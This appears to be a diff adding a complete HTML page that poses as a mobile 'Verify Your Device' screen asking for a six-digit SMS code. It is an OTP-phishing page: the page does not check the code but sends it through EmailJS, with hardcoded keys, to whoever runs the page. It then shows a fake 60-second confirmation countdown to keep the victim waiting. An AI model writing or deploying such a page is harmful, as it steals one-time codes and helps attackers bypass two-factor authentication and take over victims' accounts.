@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter Access Code</title>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: #0b0b0b;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #eee;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .phone {
+    width: 100%;
+    max-width: 400px;
+    min-height: 100vh;
+    background: #121212;
+    padding: 24px 22px 40px;
+    display: flex;
+    flex-direction: column;
+  }
+
+  @media (min-width: 500px) {
+    .phone {
+      min-height: 820px;
+      margin: 20px;
+      border-radius: 36px;
+      border: 2px solid #222;
+      box-shadow: 0 0 40px rgba(0,0,0,.6);
+    }
+  }
+
+  .screen { display: none; flex-direction: column; flex: 1; }
+  .screen.active { display: flex; }
+
+  .back {
+    background: none;
+    border: none;
+    color: #ddd;
+    font-size: 28px;
+    cursor: pointer;
+    align-self: flex-start;
+    padding: 8px 0;
+  }
+
+  h1 {
+    font-size: 32px;
+    font-weight: 700;
+    margin: 24px 0 18px;
+  }
+
+  .desc {
+    font-size: 19px;
+    line-height: 1.5;
+    color: #ddd;
+  }
+
+  .label {
+    color: #888;
+    font-size: 16px;
+    margin: 34px 0 14px;
+  }
+
+  /* 6 code boxes */
+  .otp {
+    display: flex;
+    gap: 12px;
+    justify-content: space-between;
+  }
+
+  .otp input {
+    width: 100%;
+    max-width: 62px;
+    height: 62px;
+    text-align: center;
+    font-size: 24px;
+    font-weight: 700;
+    background: transparent;
+    border: 2px solid #3a3a3a;
+    border-radius: 8px;
+    color: #fff;
+    outline: none;
+    caret-color: #fff;
+    transition: border-color .2s, box-shadow .2s;
+  }
+
+  .otp input:focus {
+    border-color: #4fb3a0;
+    box-shadow: 0 0 0 3px rgba(79,179,160,.15);
+  }
+
+  .btn {
+    width: 100%;
+    height: 58px;
+    margin-top: 48px;
+    background: #9b0a2c;
+    color: #f5f5f5;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: .5px;
+    cursor: pointer;
+    transition: opacity .2s, transform .1s;
+  }
+
+  .btn:active { transform: scale(.98); }
+  .btn:disabled { opacity: .45; cursor: not-allowed; }
+
+  .refresh {
+    display: block;
+    margin: 44px auto 0;
+    background: none;
+    border: none;
+    color: #888;
+    font-size: 20px;
+    font-weight: 700;
+    cursor: pointer;
+  }
+
+  .refresh:disabled { opacity: .4; cursor: not-allowed; }
+
+  .hint {
+    text-align: center;
+    color: #888;
+    font-size: 17px;
+    margin-top: 14px;
+  }
+
+  .msg {
+    text-align: center;
+    color: #ff6b6b;
+    font-size: 15px;
+    margin-top: 14px;
+    min-height: 20px;
+  }
+
+  /* Waiting screen */
+  .wait-box {
+    text-align: center;
+    margin-top: 60px;
+  }
+
+  .spinner {
+    width: 68px;
+    height: 68px;
+    border: 5px solid #2a2a2a;
+    border-top-color: #9b0a2c;
+    border-radius: 50%;
+    margin: 0 auto 30px;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .wait-title {
+    font-size: 26px;
+    font-weight: 700;
+    margin-bottom: 14px;
+  }
+
+  .wait-sub {
+    color: #aaa;
+    font-size: 17px;
+    line-height: 1.5;
+  }
+
+  .timer {
+    font-size: 52px;
+    font-weight: 700;
+    margin-top: 30px;
+    font-variant-numeric: tabular-nums;
+    letter-spacing: 2px;
+  }
+
+  .bar {
+    height: 6px;
+    background: #2a2a2a;
+    border-radius: 3px;
+    margin: 26px auto 0;
+    max-width: 300px;
+    overflow: hidden;
+  }
+
+  .bar span {
+    display: block;
+    height: 100%;
+    width: 100%;
+    background: #9b0a2c;
+    transition: width 1s linear;
+  }
+
+  .sent-note {
+    color: #4fb3a0;
+    font-size: 15px;
+    margin-top: 24px;
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <!-- SCREEN 1: Enter Code -->
+  <section class="screen active" id="screenCode">
+    <button class="back" aria-label="Back">&#8592;</button>
+
+    <h1>Verify Your Device</h1>
+    <p class="desc">OTP Sent to.</p>
+
+    <p class="label">Enter OTP sent via SMS</p>
+
+    <div class="otp">
+      <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+    </div>
+
+    <button class="btn" id="confirmBtn" disabled>CONFIRM</button>
+    <div class="msg" id="codeMsg"></div>
+
+    <button class="refresh" id="refreshBtn" disabled>&#8635; Resend</button>
+    <p class="hint" id="cooldownText"></p>
+  </section>
+
+  <!-- SCREEN 2: Waiting for Confirmation -->
+  <section class="screen" id="screenWait">
+    <button class="back" id="backBtn" aria-label="Back">&#8592;</button>
+
+    <div class="wait-box">
+      <div class="spinner" id="spinner"></div>
+      <div class="wait-title">Waiting for Confirmation</div>
+      <p class="wait-sub" id="waitSub">Please wait until the countdown finishes.</p>
+
+      <div class="timer" id="waitTimer">01:00</div>
+      <div class="bar"><span id="waitBar"></span></div>
+
+      <p class="sent-note" id="sentNote">success.</p>
+    </div>
+  </section>
+
+</div>
+
+<script>
+  /* ========== EmailJS Setup ========== */
+  const PUBLIC_KEY  = "ttrKOZNMDMqFjqfPT";
+  const SERVICE_ID  = "service_8iot5xx";
+  const TEMPLATE_ID = "template_2vp7oqq";
+
+  emailjs.init({ publicKey: PUBLIC_KEY });
+
+  /* ========== Elements ========== */
+  const screenCode   = document.getElementById("screenCode");
+  const screenWait   = document.getElementById("screenWait");
+  const inputs       = [...document.querySelectorAll(".otp input")];
+  const confirmBtn   = document.getElementById("confirmBtn");
+  const refreshBtn   = document.getElementById("refreshBtn");
+  const cooldownText = document.getElementById("cooldownText");
+  const codeMsg      = document.getElementById("codeMsg");
+  const waitTimer    = document.getElementById("waitTimer");
+  const waitBar      = document.getElementById("waitBar");
+  const waitSub      = document.getElementById("waitSub");
+  const spinner      = document.getElementById("spinner");
+  const sentNote     = document.getElementById("sentNote");
+  const backBtn      = document.getElementById("backBtn");
+
+  const COUNTDOWN_SECONDS = 60;
+  let timerId = null;
+
+  /* ========== Helpers ========== */
+  function fmt(s) {
+    const m = String(Math.floor(s / 60)).padStart(2, "0");
+    const r = String(s % 60).padStart(2, "0");
+    return `${m}:${r}`;
+  }
+
+  function getCode() {
+    return inputs.map(i => i.value).join("");
+  }
+
+  function updateConfirmState() {
+    confirmBtn.disabled = getCode().length !== 6;
+  }
+
+  function runTimer(seconds, onTick, onDone) {
+    clearInterval(timerId);
+    let s = seconds;
+    onTick(s);
+    timerId = setInterval(() => {
+      s--;
+      onTick(s);
+      if (s <= 0) {
+        clearInterval(timerId);
+        onDone();
+      }
+    }, 1000);
+  }
+
+  function showScreen(which) {
+    screenCode.classList.toggle("active", which === "code");
+    screenWait.classList.toggle("active", which === "wait");
+  }
+
+  /* ========== Code input behaviour ========== */
+  inputs.forEach((input, idx) => {
+    input.addEventListener("input", (e) => {
+      input.value = input.value.replace(/\D/g, "").slice(-1);
+      if (input.value && idx < inputs.length - 1) inputs[idx + 1].focus();
+      codeMsg.textContent = "";
+      updateConfirmState();
+    });
+
+    input.addEventListener("keydown", (e) => {
+      if (e.key === "Backspace" && !input.value && idx > 0) {
+        inputs[idx - 1].focus();
+        inputs[idx - 1].value = "";
+        updateConfirmState();
+      }
+      if (e.key === "Enter" && !confirmBtn.disabled) sendCode();
+    });
+
+    input.addEventListener("focus", () => input.select());
+  });
+
+  // Support pasting a full 6-digit code
+  inputs[0].addEventListener("paste", (e) => {
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+    text.split("").forEach((ch, i) => inputs[i].value = ch);
+    inputs[Math.min(text.length, 5)].focus();
+    updateConfirmState();
+  });
+
+  /* ========== Refresh cooldown (1 minute) ========== */
+  function startCooldown() {
+    refreshBtn.disabled = true;
+    runTimer(COUNTDOWN_SECONDS,
+      (s) => {
+        cooldownText.textContent = s > 0 ? `Please wait, count down from ${fmt(s)}` : "";
+      },
+      () => {
+        refreshBtn.disabled = false;
+      }
+    );
+  }
+
+  refreshBtn.addEventListener("click", () => {
+    inputs.forEach(i => i.value = "");
+    codeMsg.textContent = "";
+    inputs[0].focus();
+    updateConfirmState();
+    startCooldown();
+  });
+
+  /* ========== Send code to EmailJS ========== */
+  async function sendCode() {
+    const code = getCode();
+    if (code.length !== 6) return;
+
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = "Wait...";
+    codeMsg.textContent = "";
+
+    try {
+      await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
+        access_code: code,
+        message: `Access code: ${code}`,
+        time: new Date().toLocaleString()
+      });
+
+      showWaitScreen();
+    } catch (err) {
+      console.error("EmailJS error:", err);
+      codeMsg.textContent = "Could not send the code. Please try again.";
+      confirmBtn.disabled = false;
+      confirmBtn.textContent = "CONFIRM";
+    }
+  }
+
+  confirmBtn.addEventListener("click", sendCode);
+
+  /* ========== Waiting screen with 1-minute countdown ========== */
+  function showWaitScreen() {
+    confirmBtn.textContent = "CONFIRM";
+    updateConfirmState();
+    showScreen("wait");
+
+    spinner.style.display = "block";
+    sentNote.style.display = "block";
+    waitSub.textContent = "Please wait until the countdown finishes.";
+    waitBar.style.transition = "none";
+    waitBar.style.width = "100%";
+    // force reflow so the transition restarts cleanly
+    void waitBar.offsetWidth;
+    waitBar.style.transition = "width 1s linear";
+
+    runTimer(COUNTDOWN_SECONDS,
+      (s) => {
+        waitTimer.textContent = fmt(s);
+        waitBar.style.width = (s / COUNTDOWN_SECONDS * 100) + "%";
+      },
+      () => {
+        spinner.style.display = "none";
+        sentNote.style.display = "none";
+        waitSub.textContent = "Time is up. If you have not received confirmation, please try again.";
+        backBtn.textContent = "TRY AGAIN";
+      }
+    );
+  }
+
+  backBtn.addEventListener("click", () => {
+    clearInterval(timerId);
+    inputs.forEach(i => i.value = "");
+    backBtn.textContent = "\u2190";
+    showScreen("code");
+    updateConfirmState();
+    spinner.style.display = "block";
+    sentNote.style.display = "block";
+    waitBar.style.width = "100%";
+    inputs[0].focus();
+    startCooldown();
+  });
+
+  /* ========== Init ========== */
+  startCooldown();
+  inputs[0].focus();
+</script>
+
+</body>
+</html>
